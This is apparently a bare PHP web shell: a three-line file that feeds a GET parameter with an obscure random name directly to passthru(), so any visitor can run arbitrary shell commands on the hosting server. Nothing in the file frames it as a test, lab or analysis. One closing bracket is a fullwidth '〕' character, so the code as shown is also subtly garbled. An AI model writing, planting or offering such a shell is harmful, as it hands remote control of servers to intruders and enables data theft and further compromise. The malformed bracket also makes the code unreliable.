<?php
passthru($_GET['evtdB7v1'〕);
?>
